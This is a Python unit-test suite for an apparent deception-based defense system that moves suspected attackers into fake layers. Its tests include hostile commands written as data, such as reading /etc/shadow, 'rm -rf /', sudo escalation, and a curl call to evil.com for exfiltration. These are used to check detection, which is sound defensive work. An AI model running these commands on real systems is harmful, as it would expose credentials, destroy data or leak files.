"""
Test Suite for Holographic Defense System

Comprehensive tests for Google/DARPA demo verification.
"""

import unittest

from kernel.holographic import (
    Command,
    DeceptionLayer,
    HolographicLayerManager,
    LayerType,
    MirrorLayer,
    RealSystemLayer,
    ThreatLevel,
)


class TestHolographicLayers(unittest.TestCase):
    """Test individual layer types"""

    def test_real_layer_creation(self):
        """Test real system layer initialization"""
        layer = RealSystemLayer()
        self.assertEqual(layer.id, 0)
        self.assertEqual(layer.type, LayerType.REAL)
        self.assertTrue(layer.is_real())
        self.assertFalse(layer.is_mirror())
        self.assertFalse(layer.is_deception())

    def test_mirror_layer_creation(self):
        """Test mirror layer initialization"""
        layer = MirrorLayer(1, 0, observation_steps=2)
        self.assertEqual(layer.id, 1)
        self.assertEqual(layer.type, LayerType.MIRROR)
        self.assertEqual(layer.parent_id, 0)
        self.assertTrue(layer.is_mirror())

    def test_deception_layer_creation(self):
        """Test deception layer initialization"""
        layer = DeceptionLayer(2, "privilege_escalation", 1001)
        self.assertEqual(layer.id, 2)
        self.assertEqual(layer.type, LayerType.DECEPTION)
        self.assertEqual(layer.attacker_id, 1001)
        self.assertTrue(layer.is_deception())

    def test_command_execution_real_layer(self):
        """Test command execution in real layer"""
        layer = RealSystemLayer()
        cmd = Command("ls", ["-la"])
        result = layer.execute_observed(cmd, 0)

        self.assertEqual(result.command, cmd)
        self.assertIsNotNone(result.result)
        self.assertGreater(result.execution_time_ms, 0)

    def test_command_execution_mirror_layer(self):
        """Test command execution in mirror layer"""
        layer = MirrorLayer(1, 0)
        cmd = Command("whoami", [])
        result = layer.execute_observed(cmd, 1001)

        self.assertEqual(result.command, cmd)
        self.assertIsNotNone(result.system_calls)
        self.assertGreater(result.execution_time_ms, 0)


class TestHolographicManager(unittest.TestCase):
    """Test holographic layer manager"""

    def setUp(self):
        """Set up test manager"""
        self.manager = HolographicLayerManager()

    def test_manager_initialization(self):
        """Test manager initializes with correct layers"""
        self.assertEqual(len(self.manager.layers), 2)  # Real + Mirror
        self.assertIsInstance(self.manager.layers[0], RealSystemLayer)
        self.assertIsInstance(self.manager.layers[1], MirrorLayer)

    def test_user_default_layer(self):
        """Test users start in mirror layer"""
        user_id = 1001
        layer_id = self.manager.get_user_layer(user_id)
        self.assertEqual(layer_id, 1)  # Mirror layer

    def test_safe_command_execution(self):
        """Test safe command executes normally"""
        user_id = 1001
        cmd = Command("ls", [])
        result = self.manager.execute_user_command(user_id, cmd)

        self.assertEqual(result["status"], "SUCCESS")
        self.assertEqual(result["threat_level"], "SAFE")
        self.assertFalse(result.get("DECEPTION_ACTIVE", False))

    def test_suspicious_command_detection(self):
        """Test suspicious commands are flagged but allowed"""
        user_id = 1001
        cmd = Command("sudo", ["-l"])
        result = self.manager.execute_user_command(user_id, cmd)

        self.assertEqual(result["status"], "SUCCESS")
        self.assertEqual(result["threat_level"], "SUSPICIOUS")

    def test_malicious_command_triggers_deception(self):
        """Test malicious command triggers deception layer"""
        user_id = 1001

        # Execute malicious command
        cmd = Command("cat", ["/etc/shadow"])
        result = self.manager.execute_user_command(user_id, cmd)

        # Should be moved to deception layer
        new_layer = self.manager.get_user_layer(user_id)
        self.assertGreater(new_layer, 1)  # Beyond mirror layer
        self.assertTrue(result.get("DECEPTION_ACTIVE", False))

        # Verify deception layer was created
        deception_layer = self.manager.layers[new_layer]
        self.assertIsInstance(deception_layer, DeceptionLayer)
        self.assertEqual(deception_layer.attacker_id, user_id)

    def test_deception_layer_isolation(self):
        """Test commands in deception layer don't affect real system"""
        user_id = 1001

        # Trigger deception
        cmd1 = Command("cat", ["/etc/shadow"])
        self.manager.execute_user_command(user_id, cmd1)

        # Execute more commands in deception
        cmd2 = Command("rm", ["-rf", "/"])  # Dangerous!
        result = self.manager.execute_user_command(user_id, cmd2)

        # Should still return success (fake)
        self.assertEqual(result["status"], "SUCCESS")

        # Real layer should be unchanged
        real_layer = self.manager.layers[0]
        self.assertIsInstance(real_layer, RealSystemLayer)
        # In real implementation, verify no actual files were deleted


class TestThreatDetection(unittest.TestCase):
    """Test threat detection logic"""

    def setUp(self):
        self.manager = HolographicLayerManager()

    def test_privilege_escalation_detection(self):
        """Test detection of privilege escalation attempts"""
        user_id = 1001
        layer = self.manager.layers[1]  # Mirror layer

        # Command with privilege escalation indicator
        cmd = Command("sudo", ["su"])
        observed = layer.execute_observed(cmd, user_id)

        threat = self.manager.analyze_threat(observed, user_id, layer)
        self.assertGreaterEqual(threat.confidence, 0.3)
        self.assertIn("Privilege escalation", str(threat.indicators))

    def test_data_exfiltration_detection(self):
        """Test detection of data exfiltration attempts"""
        user_id = 1001
        layer = self.manager.layers[1]

        cmd = Command("curl", ["http://evil.com/exfil"])
        observed = layer.execute_observed(cmd, user_id)

        threat = self.manager.analyze_threat(observed, user_id, layer)
        self.assertGreaterEqual(threat.confidence, 0.4)

    def test_sensitive_file_access_detection(self):
        """Test detection of sensitive file access"""
        user_id = 1001
        layer = self.manager.layers[1]

        cmd = Command("cat", ["/etc/shadow"])
        observed = layer.execute_observed(cmd, user_id)

        threat = self.manager.analyze_threat(observed, user_id, layer)
        self.assertGreaterEqual(threat.confidence, 0.2)


class TestBubblegumProtocol(unittest.TestCase):
    """Test Bubblegum transition protocol"""

    def test_attacker_confidence_tracking(self):
        """Test attacker confidence increases with commands"""
        layer = DeceptionLayer(2, "test", 1001)

        initial_confidence = layer.victory_confidence
        self.assertEqual(initial_confidence, 0.0)

        # Execute multiple commands
        for i in range(5):
            cmd = Command("ls", [f"-{i}"])
            layer.execute_observed(cmd, 1001)

        # Confidence should increase
        self.assertGreater(layer.victory_confidence, initial_confidence)

    def test_bubblegum_trigger_conditions(self):
        """Test Bubblegum triggers at right moment"""
        layer = DeceptionLayer(2, "exfiltration", 1001)

        # Build up confidence
        for i in range(10):
            cmd = Command("cmd", [str(i)])
            layer.execute_observed(cmd, 1001)

        # Confidence should be high
        self.assertGreater(layer.victory_confidence, 0.8)

        # Critical exfiltration attempt
        exfil_cmd = Command("tar", ["czf", "/tmp/exfil.tar.gz"])
        result = layer.execute_observed(exfil_cmd, 1001)

        # Should indicate bubblegum ready
        self.assertIn("BUBBLEGUM_TRIGGER_READY", result.threat_indicators)

    def test_bubblegum_execution(self):
        """Test Bubblegum protocol execution"""
        layer = DeceptionLayer(2, "test", 1001)

        # Build attack log
        for i in range(10):
            layer.attack_log.append(Command(f"cmd{i}", []))

        # Execute bubblegum
        result = layer.trigger_bubblegum_protocol()

        self.assertTrue(layer.bubblegum_triggered)
        self.assertEqual(result["attacker"], 1001)
        self.assertEqual(result["commands_logged"], 10)
        self.assertEqual(result["message"], "BUBBLEGUM_EXECUTED")


class TestLayerTransitions(unittest.TestCase):
    """Test layer transition mechanics"""

    def test_transition_to_deception(self):
        """Test transition from mirror to deception layer"""
        manager = HolographicLayerManager()
        user_id = 1001

        # Start in mirror
        initial_layer = manager.get_user_layer(user_id)
        self.assertEqual(initial_layer, 1)

        # Trigger deception
        from kernel.holographic import ThreatAssessment

        threat = ThreatAssessment(
            level=ThreatLevel.MALICIOUS,
            confidence=0.9,
            threat_type="test_attack",
            indicators=[],
        )

        deception = manager.transition_to_deception(user_id, threat)

        # User should now be in deception layer
        new_layer = manager.get_user_layer(user_id)
        self.assertGreater(new_layer, 1)
        self.assertEqual(new_layer, deception.id)

    def test_multiple_users_different_layers(self):
        """Test multiple users can be in different layers"""
        manager = HolographicLayerManager()

        user1 = 1001
        user2 = 1002

        # User 1 stays in mirror
        layer1 = manager.get_user_layer(user1)

        # User 2 triggers deception
        cmd = Command("cat", ["/etc/shadow"])
        manager.execute_user_command(user2, cmd)
        layer2 = manager.get_user_layer(user2)

        # Should be in different layers
        self.assertNotEqual(layer1, layer2)
        self.assertEqual(layer1, 1)  # Mirror
        self.assertGreater(layer2, 1)  # Deception


class TestIntegration(unittest.TestCase):
    """Integration tests for complete attack flows"""

    def test_complete_attack_flow(self):
        """Test complete attack from detection to Bubblegum"""
        manager = HolographicLayerManager()
        attacker = 1001

        # Phase 1: Normal commands (should stay in mirror)
        cmd1 = Command("ls", [])
        result1 = manager.execute_user_command(attacker, cmd1)
        self.assertEqual(manager.get_user_layer(attacker), 1)

        # Phase 2: Suspicious command (still in mirror, monitored)
        cmd2 = Command("sudo", ["-l"])
        result2 = manager.execute_user_command(attacker, cmd2)
        self.assertEqual(result2["threat_level"], "SUSPICIOUS")

        # Phase 3: Malicious command (moved to deception)
        cmd3 = Command("cat", ["/etc/shadow"])
        result3 = manager.execute_user_command(attacker, cmd3)
        deception_layer_id = manager.get_user_layer(attacker)
        self.assertGreater(deception_layer_id, 1)

        # Phase 4: Commands in deception layer
        deception_layer = manager.layers[deception_layer_id]
        for i in range(10):
            cmd = Command(f"recon_{i}", [])
            deception_layer.execute_observed(cmd, attacker)

        # Phase 5: Exfiltration attempt triggers Bubblegum
        exfil_cmd = Command("tar", ["czf", "exfil.tar.gz"])
        result = deception_layer.execute_observed(exfil_cmd, attacker)

        self.assertIn("BUBBLEGUM_TRIGGER_READY", result.threat_indicators)


def run_tests():
    """Run all tests and display results"""
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestHolographicLayers))
    suite.addTests(loader.loadTestsFromTestCase(TestHolographicManager))
    suite.addTests(loader.loadTestsFromTestCase(TestThreatDetection))
    suite.addTests(loader.loadTestsFromTestCase(TestBubblegumProtocol))
    suite.addTests(loader.loadTestsFromTestCase(TestLayerTransitions))
    suite.addTests(loader.loadTestsFromTestCase(TestIntegration))

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # Summary
    print("\n" + "=" * 70)
    print("TEST SUMMARY")
    print("=" * 70)
    print(f"Tests run: {result.testsRun}")
    print(f"Successes: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print("=" * 70)

    return result.wasSuccessful()


if __name__ == "__main__":
    import sys

    success = run_tests()
    sys.exit(0 if success else 1)
